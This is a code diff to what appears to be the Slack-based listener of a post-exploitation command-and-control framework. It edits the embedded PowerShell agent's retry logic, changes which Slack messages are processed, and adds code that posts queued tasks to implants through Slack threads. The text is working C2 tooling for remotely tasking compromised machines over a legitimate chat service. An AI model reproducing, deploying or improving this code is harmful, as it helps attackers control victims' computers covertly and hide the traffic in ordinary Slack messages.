@@ -484,7 +484,6 @@ class Listener:
                                 }
                             }
                             catch [System.Net.WebException] {
-                                get-winhomelocation
                                 Write-Host "Checking response, $_";
                                 if($_.Exception.InnerException.Response.StatusCode.value__ -eq 429) {
                                     $secs = $_.Exception.InnerException.Response.Headers.Get("Retry-After")*2
@@ -518,7 +517,6 @@ class Listener:
 
                             }
                             catch [System.Net.WebException] {
-                                get-winhomelocation
                                 if($e.Exception.InnerException.Response.StatusCode.value__ -eq 429) {
                                     $secs = $e.Exception.InnerException.Response.Headers.Get("Retry-After")*2
                                     Write-Host "Waiting $secs seconds... (post request)";
@@ -583,6 +581,7 @@ class Listener:
                                             $success = $true
                                         }
                                         catch [System.Net.WebException] {
+                                            $success = $false
                                             $failures += 1
                                             if($_.Exception.InnerException.Response.StatusCode.value__ -eq 429) {
                                                 $secs = $_.Exception.InnerException.Response.Headers.Get("Retry-After")*2*($failures)
@@ -642,7 +641,7 @@ class Listener:
             for event in slack_events:
                 # if it has a type and subtype most likely a message to process
                 if 'type' in event and 'subtype' in event:
-                    if event["type"] == "message" and event["channel"] != bot_id and event["subtype"] != "message_replied":
+                    if event["type"] == "message" and event["channel"] != bot_id and event["subtype"] == "bot_message":
                         thread_ts = event["ts"]
 
                         if 'thread_ts' in event:
@@ -903,10 +902,6 @@ class Listener:
                         agent, stage, data, thread_ts = message
                         # if there is some data then proceed
                         if data:
-
-                            # we have data lets grab a list of agents
-                            agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
-
                             if stage == '3':
                                 lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options)[0]
                                 stage_data = base64.encodestring(return_val)
@@ -940,7 +935,6 @@ class Listener:
                                 post_data(agent_upload,agent,channel_id,thread_ts,listener_name,user_api_token)
 
                             else:
-
                                 # Process agent checking and handle any agent data
                                 seen_time = datetime.utcfromtimestamp(float(thread_ts))
                                 self.mainMenu.agents.update_agent_lastseen_db(agent, seen_time)
@@ -951,9 +945,24 @@ class Listener:
                                     for task in task_data:
                                         lang, data = task
                                         if data and data != "VALID":
+                                            self.mainMenu.agents.agents[agent].pop('request_ts', None)
                                             slack_client.api_call('chat.postMessage', channel=channel_id, text="Starting", thread_ts=thread_ts)
                                             data_thread = post_data(base64.encodestring(data),agent,channel_id,None,listener_name,user_api_token)
                                             slack_client.api_call('chat.postMessage', channel=channel_id, text=data_thread, thread_ts=thread_ts)
+                                        else:
+                                            if agent in self.mainMenu.agents.agents:
+                                                self.mainMenu.agents.agents[agent]['request_ts'] = thread_ts
+
+                    #Upload agent tasks for any agents that have asked recently. (so we don't wait for the next request)
+                    agents = self.mainMenu.agents.agents
+                    for agent in self.mainMenu.agents.get_agents_for_listener(listener_name):
+                        if 'request_ts' in agents[agent]:
+                            data = self.mainMenu.agents.handle_agent_request(agent, 'powershell', staging_key, update_lastseen=False)
+                            if data and data != "VALID":
+                                self.mainMenu.agents.agents[agent].pop('request_ts', None)
+                                slack_client.api_call('chat.postMessage', channel=channel_id, text="Starting", thread_ts=thread_ts)
+                                data_thread = post_data(base64.encodestring(data),agent,channel_id,None,listener_name,user_api_token)
+                                slack_client.api_call('chat.postMessage', channel=channel_id, text=data_thread, thread_ts=thread_ts)
 
                    
                 except Exception as e:
